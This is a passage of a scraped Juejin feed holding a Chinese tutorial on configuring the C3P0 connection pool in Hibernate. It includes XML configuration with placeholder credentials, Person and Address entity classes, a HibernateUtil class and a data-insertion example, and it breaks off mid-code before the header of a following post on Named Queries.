                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">Hibernate的连接池</h3>
<p>在数据库应用程序中，连接池（Connection Pool）是指一组预先建立的数据库连接，以供应用程序重复使用。连接池可以显著提高应用程序的性能，因为创建和关闭数据库连接是非常耗时的操作。通过使用连接池，可以减少连接的创建和关闭次数，从而提高效率。</p>
<p>Hibernate可以与多种连接池实现集成，包括C3P0、Apache DBCP、HikariCP等。每种连接池都有其特定的配置参数。</p>
<h3 data-id="heading-1">使用Hibernate配置连接池</h3>
<p>下面将详细介绍如何在Hibernate中配置C3P0连接池。</p>
<h3 data-id="heading-2">示例代码</h3>
<h4 data-id="heading-3">配置文件 <code>hibernate.cfg.xml</code></h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hibernate-configuration</span> <span class="hljs-keyword">PUBLIC</span>
        <span class="hljs-string">"-//Hibernate/Hibernate Configuration DTD 3.0//EN"</span>
        <span class="hljs-string">"http://hibernate.sourceforge.net/hibernate-configuration-3.0.dtd"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">hibernate-configuration</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">session-factory</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- 数据库连接配置 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.driver_class"</span>&gt;</span>com.mysql.cj.jdbc.Driver<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.url"</span>&gt;</span>jdbc:mysql://localhost:3306/your_database<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.username"</span>&gt;</span>your_username<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.password"</span>&gt;</span>your_password<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- Hibernate 属性配置 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.dialect"</span>&gt;</span>org.hibernate.dialect.MySQLDialect<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.show_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.format_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.hbm2ddl.auto"</span>&gt;</span>update<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- C3P0 连接池配置 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.c3p0.min_size"</span>&gt;</span>5<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.c3p0.max_size"</span>&gt;</span>20<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.c3p0.timeout"</span>&gt;</span>300<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.c3p0.max_statements"</span>&gt;</span>50<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.c3p0.idle_test_period"</span>&gt;</span>3000<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- 映射类 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">mapping</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.example.domain.Person"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">mapping</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.example.domain.Address"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">session-factory</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">hibernate-configuration</span>&gt;</span>
</code></pre>
<h3 data-id="heading-4">实体类示例</h3>
<p>以<code>Person</code>和<code>Address</code>为例，这些类与之前的示例相同。</p>
<h4 data-id="heading-5">Person类</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.domain;

<span class="hljs-keyword">import</span> javax.persistence.*;
<span class="hljs-keyword">import</span> java.util.HashSet;
<span class="hljs-keyword">import</span> java.util.Set;

<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "person")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> {

    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;

    <span class="hljs-meta">@Column(name = "name")</span>
    <span class="hljs-keyword">private</span> String name;

    <span class="hljs-meta">@Column(name = "age")</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;

    <span class="hljs-meta">@OneToMany(mappedBy = "person", fetch = FetchType.LAZY, cascade = CascadeType.ALL)</span>
    <span class="hljs-keyword">private</span> Set&lt;Address&gt; addresses = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;();

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span> {}

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> {
        <span class="hljs-built_in">this</span>.name = name;
        <span class="hljs-built_in">this</span>.age = age;
    }

    <span class="hljs-comment">// Getters 和 Setters</span>

    <span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> id;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-built_in">this</span>.id = id;
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> {
        <span class="hljs-built_in">this</span>.name = name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> age;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> {
        <span class="hljs-built_in">this</span>.age = age;
    }

    <span class="hljs-keyword">public</span> Set&lt;Address&gt; <span class="hljs-title function_">getAddresses</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> addresses;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAddresses</span><span class="hljs-params">(Set&lt;Address&gt; addresses)</span> {
        <span class="hljs-built_in">this</span>.addresses = addresses;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addAddress</span><span class="hljs-params">(Address address)</span> {
        addresses.add(address);
        address.setPerson(<span class="hljs-built_in">this</span>);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">removeAddress</span><span class="hljs-params">(Address address)</span> {
        addresses.remove(address);
        address.setPerson(<span class="hljs-literal">null</span>);
    }
}
</code></pre>
<h4 data-id="heading-6">Address类</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.domain;

<span class="hljs-keyword">import</span> javax.persistence.*;

<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "address")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Address</span> {

    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;

    <span class="hljs-meta">@Column(name = "street")</span>
    <span class="hljs-keyword">private</span> String street;

    <span class="hljs-meta">@ManyToOne</span>
    <span class="hljs-meta">@JoinColumn(name = "person_id", nullable = false)</span>
    <span class="hljs-keyword">private</span> Person person;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Address</span><span class="hljs-params">()</span> {}

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Address</span><span class="hljs-params">(String street, Person person)</span> {
        <span class="hljs-built_in">this</span>.street = street;
        <span class="hljs-built_in">this</span>.person = person;
    }

    <span class="hljs-comment">// Getters 和 Setters</span>

    <span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> id;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-built_in">this</span>.id = id;
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getStreet</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> street;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setStreet</span><span class="hljs-params">(String street)</span> {
        <span class="hljs-built_in">this</span>.street = street;
    }

    <span class="hljs-keyword">public</span> Person <span class="hljs-title function_">getPerson</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> person;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setPerson</span><span class="hljs-params">(Person person)</span> {
        <span class="hljs-built_in">this</span>.person = person;
    }
}
</code></pre>
<h4 data-id="heading-7">HibernateUtil类</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.cfg.Configuration;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateUtil</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> SessionFactory sessionFactory;

    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 从配置文件创建SessionFactory</span>
            sessionFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate.cfg.xml"</span>).buildSessionFactory();
        } <span class="hljs-keyword">catch</span> (Throwable ex) {
            <span class="hljs-comment">// 记录启动失败的错误</span>
            System.err.println(<span class="hljs-string">"Initial SessionFactory creation failed."</span> + ex);
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExceptionInInitializerError</span>(ex);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> SessionFactory <span class="hljs-title function_">getSessionFactory</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> sessionFactory;
    }
}
</code></pre>
<h3 data-id="heading-8">使用连接池的示例</h3>
<h4 data-id="heading-9">插入数据示例</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.Session;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.Transaction;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateConnectionPoolExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// 获取SessionFactory</span>
        <span class="hljs-type">SessionFactory</span> <span class="hljs-variable">sessionFactory</span> <span class="hljs-operator">=</span> HibernateUtil.getSessionFactory();

        <span class="hljs-comment">// 插入数据</span>
        insertSampleData(sessionFactory);

        <span class="hljs-comment">// 关闭SessionFactory</span>
        sessionFactory.close();
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">insertSampleData</span><span class="hljs-params">(SessionFactory sessionFactory)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">"John Doe"</span>, <span class="hljs-number">30</span>);
            <span class="hljs-type">Address</span> <span class="hljs-variable">address1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Address</span>(<span class="hljs-string">"123 Street"</span>, person);
            <span class="hljs-type">Address</span> <span class="hljs-variable">address2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Address</span>(<span class="hljs-string">"456 Avenue"</span>, person);

            person.addAddress(address1);
            person.addAddress(address2);

            <span class="hljs-comment">// 保存Person对象时，级联保存Address对象</span>
            session.save(person);
            transaction.commit();
            System.out.println(<span class="hljs-string">"Inserted Person with Addresses"</span>);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">if</span> (transaction != <span class="hljs-literal">null</span>) {
                transaction.rollback();
            }
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            <span class="hljs-keyword">if</span> (session != <span class="hljs-literal">null</span>) {
                session.close();
            }
        }
    }
}
</code></pre>
<h3 data-id="heading-10">连接池配置详细解释</h3>
<ol>
<li>
<p><strong>配置文件 <code>hibernate.cfg.xml</code></strong>：定义数据库连接信息、Hibernate属性配置以及实体类映射配置。</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.driver_class"</span>&gt;</span>com.mysql.cj.jdbc.Driver<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.url"</span>&gt;</span>jdbc:mysql://localhost:3306/your_database<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.username"</span>&gt;</span>your_username<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.password"</span>&gt;</span>your_password<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.dialect"</span>&gt;</span>org.hibernate.dialect.MySQLDialect<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.show_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.format_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.hbm2ddl.auto"</span>&gt;</span>update<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

<span class="hljs-comment">&lt;!-- C3P0 连接池配置 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.c3p0.min_size"</span>&gt;</span>5<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.c3p0.max_size"</span>&gt;</span>20<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.c3p0.timeout"</span>&gt;</span>300<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.c3p0.max_statements"</span>&gt;</span>50<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.c3p0.idle_test_period"</span>&gt;</span>3000<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
</code></pre>
</li>
<li>
<p><strong>实体类 <code>Person</code> 和 <code>Address</code></strong>：定义实体类及其属性。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "person")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> {
    <span class="hljs-comment">// 属性和方法</span>
}

<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "address")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Address</span> {
    <span class="hljs-comment">// 属性和方法</span>
}
</code></pre>
</li>
<li>
<p><strong>HibernateUtil类</strong>：创建并管理SessionFactory。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateUtil</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> SessionFactory sessionFactory;

    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 从配置文件创建SessionFactory</span>
            sessionFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate.cfg.xml"</span>).buildSessionFactory();
        } <span class="hljs-keyword">catch</span> (Throwable ex) {
            <span class="hljs-comment">// 记录启动失败的错误</span>
            System.err.println(<span class="hljs-string">"Initial SessionFactory creation failed."</span> + ex);
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExceptionInInitializerError</span>(ex);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> SessionFactory <span class="hljs-title function_">getSessionFactory</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> sessionFactory;
    }
}
</code></pre>
</li>
<li>
<p><strong>使用连接池示例</strong>：演示如何使用配置的连接池插入数据。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateConnectionPoolExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// 获取SessionFactory</span>
        <span class="hljs-type">SessionFactory</span> <span class="hljs-variable">sessionFactory</span> <span class="hljs-operator">=</span> HibernateUtil.getSessionFactory();

        <span class="hljs-comment">// 插入数据</span>
        insertSampleData(sessionFactory);

        <span class="hljs-comment">// 关闭SessionFactory</span>
        sessionFactory.close();
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">insertSampleData</span><span class="hljs-params">(SessionFactory sessionFactory)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        
</code></pre>
</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Hibernate（30）Hibernate的Named Query是什么？]]></title>    <link>https://juejin.cn/post/7592815497847980095</link>    <guid>https://juejin.cn/post/7592815497847980095</guid>    <pubDate>2026-01-08T12:15:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592815497847980095" data-draft-id="7592815497847963711" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Hibernate（30）Hibernate的Named Query是什么？"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-08T12:15:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Hibernate（30）Hibernate的Named Query是什么？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T12:15:43.000Z" title="Thu Jan 08 2026 12:15:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
